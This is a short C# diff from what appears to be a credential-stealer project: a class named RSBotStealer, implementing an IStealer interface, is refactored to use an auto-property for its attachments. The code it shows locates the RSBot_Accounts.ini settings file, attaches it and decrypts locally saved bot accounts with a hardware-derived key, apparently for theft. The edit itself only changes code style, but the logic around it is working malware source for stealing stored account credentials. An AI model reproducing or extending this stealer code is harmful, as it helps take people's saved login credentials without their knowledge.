@@ -18,8 +18,6 @@ namespace sub.Stealers
     {
         private const string SettingsFileName = "RSBot_Accounts.ini";
 
-        private List<Attachment> _attach;
-
         private string _name = "RSBotStealer";
 
         private string _settingsFile = Path.Combine(
@@ -27,11 +25,7 @@ namespace sub.Stealers
 
         #region IStealer Members
 
-        public List<Attachment> Attachments
-        {
-            get { return _attach; }
-            set { _attach = value; }
-        }
+        public List<Attachment> Attachments { get; set; }
 
         public string Name
         {
@@ -45,7 +39,7 @@ namespace sub.Stealers
         {
             if (!File.Exists(_settingsFile))
                 return;
-            _attach = new List<Attachment> {new Attachment(_settingsFile)};
+            Attachments = new List<Attachment> {new Attachment(_settingsFile)};
             IEnumerable<RSBotAccount> accounts = GetLocalAccounts(HardwareInfo.GetLocalKey());
             foreach (RSBotAccount acc in accounts)
             {
